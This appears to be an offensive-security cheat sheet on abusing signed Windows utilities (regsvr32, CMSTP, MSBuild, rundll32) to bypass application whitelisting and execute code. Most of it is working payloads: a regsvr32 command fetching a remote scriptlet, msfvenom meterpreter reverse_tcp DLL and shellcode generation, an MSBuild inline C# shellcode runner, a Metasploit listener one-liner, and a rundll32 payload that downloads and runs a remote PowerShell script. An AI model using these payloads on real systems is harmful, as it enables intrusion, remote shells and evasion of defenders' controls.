# Trusted Developer Tools

## Regsvr32

regsvr32 is a command-line utility in Microsoft Windows for registering and unregistering DLLs and ActiveX controls in the operating system Registry.

use regsvr for bypass os and application whitelist and code execution 

### payload

```command
regsvr32  /s  /i:http://192.168.1.46/nss.sct  scrobj.dll
```

* `/s` prevent display message

* `/i` pass command line string

* `scrobj.dll` is a Windows Script Component Runtime
  
  #### nss.sct
  
  ```javascript
  <?XML version="1.0"?>
  <scriptlet>
  <registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("cmd.exe"); 
    ]]>
  </script>
  </registration>
  </scriptlet>
  ```

## CMSTP

CMSTP is a binary which is associated with the Microsoft Connection Manager Profile Installer. It accepts INF files which can be weaponised with malicious commands in order to execute arbitrary code in the form of scriptlets (SCT) and DLL

### payload

```command
cmstp /s nss.inf
```

* `/s` Specifies that the service profile should be installed or uninstalled silently

#### nss.inf

```javascript
[version]
Signature=$nooranet$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
E:\Execution\nss.dll

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="nooranetprofile"
ShortSvcName="nooranetprofile"
```

* `Nss.dll`
  
        msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > nss.dll

## MSBUILD

MSBUILD Engine is a platform for building applications. MSBuild, provides an XML schema for a project file that controls how the build platform processes and builds software.

### payload

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe e:\Execution\nooranet.xml
```

* `nooranet.xml` 
  
  ```javascript
  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
          
    <Target Name="Hello">
      <ClassExample />
    </Target>
    <UsingTask
      TaskName="ClassExample"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
     
        <Code Type="Class" Language="cs">
        <![CDATA[
  using System;
  using System.Runtime.InteropServices;
  using Microsoft.Build.Framework;
  using Microsoft.Build.Utilities;
  public class ClassExample :  Task, ITask
  {        
    private static UInt32 MEM_COMMIT = 0x1000;         
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;         
    [DllImport("kernel32")]
      private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
      UInt32 size, UInt32 flAllocationType, UInt32 flProtect);         
    [DllImport("kernel32")]
      private static extern IntPtr CreateThread(           
      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId          
      );
    [DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(          
      IntPtr hHandle,
      UInt32 dwMilliseconds
      );         
    public override bool Execute()
    {
  //replace with your own shellcode
     byte[] shellcode = new byte[354] { your shellcode} ;
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f csharp
       
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        return true;
    }
  }    
        ]]>
        </Code>
      </Task>
    </UsingTask>
  </Project>
  ```

* `shellcode` 
  
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f csharp 
  ```

* `Listener`

```bash
msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"                        
```

## Rundll32

Loads and runs dynamic-link libraries (DLLs)

#### payload -1

```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert("nooranet")
```

#### payload -2

```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

#### payload -3

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w 1 -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.46/rshell.ps1');")
```

#### payload -4

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```